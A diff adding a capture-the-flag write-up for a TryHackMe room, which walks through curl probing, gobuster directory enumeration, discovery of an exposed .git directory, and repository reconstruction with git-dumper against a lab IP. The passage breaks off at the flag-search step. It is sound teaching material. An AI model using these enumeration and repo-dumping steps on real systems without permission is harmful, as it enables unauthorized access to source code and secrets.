@@ -1,0 +1,67 @@
+# Room Name - TryHackMe: Room 404
+Date: 28 July 2026
+Difficulty: Easy
+Category: Web Enumeration / Git Exposure / Source Code Analysis
+
+# Scenario
+He booked the quiet room. It is not on the floor plan, not in the brochure, not on any door. But port 8080 is wide open, and the rooms it never lists are the ones worth finding. The challenge involved enumerating a web application running on a non-standard port, discovering an exposed .git directory, dumping the repository using git-dumper, and recovering a flag left in a README file that was never meant to ship.
+
+# Tools Used
+- TryHackMe Attack Box
+- Terminal (bash)
+- curl
+- gobuster
+- git-dumper
+- grep
+
+# What I Did
+
+Step 1 — Probe the target with curl
+- Ran a curl HEAD request to identify the web server and confirm the service was running:
+```
+curl -I http://10.49.130.64:8080
+```
+- Response confirmed the server was running Werkzeug/3.0.1 on Python/3.12.3, indicating a Python web application.
+
+Step 2 — Enumerate directories and files with gobuster
+- Ran gobuster with a broad extension list to maximise discovery:
+```
+gobuster dir -u http://10.49.130.64:8080 -w /usr/share/wordlists/dirb/common.txt -x php,js,json,zip,env,txt,git
+```
+- Discovered two items of interest:
+  - /.git (Status: 200) — exposed git repository
+  - /app.js (Status: 200) — front-end JavaScript stub
+
+Step 3 — Inspect the exposed files
+- Accessed /app.js and found a front-end stub with a TODO comment referencing a guest profiling API endpoint:
+```
+const API = "/api/guest";
+// TODO: wire to live endpoint before launch
+```
+- Accessed /.git and confirmed a full directory listing was accessible including HEAD, config, logs, objects, and refs.
+- Checked /.git/HEAD which confirmed the active branch:
+```
+ref: refs/heads/main
+```
+- Retrieved the latest commit hash from /.git/refs/heads/main:
+```
+0f13550b4cb13e9f30c61d5b342c532d21e45bda
+```
+
+Step 4 — Dump the exposed git repository
+- Cloned git-dumper and installed dependencies:
+```
+git clone https://github.com/arthaud/git-dumper.git
+cd git-dumper
+pip3 install -r requirements.txt --break-system-packages
+```
+- Ran git-dumper to reconstruct the full repository from the exposed .git directory:
+```
+python3 git_dumper.py http://10.49.130.64:8080/.git/ /home/claude/dumped_repo
+```
+- git-dumper successfully fetched all objects and ran git checkout, restoring 3 files: README.md, app.js, and index.html.
+
+Step 5 — Search the dumped repository for the flag
+- Navigated to the dumped repository and searched recursively for the flag:
+```
+cd
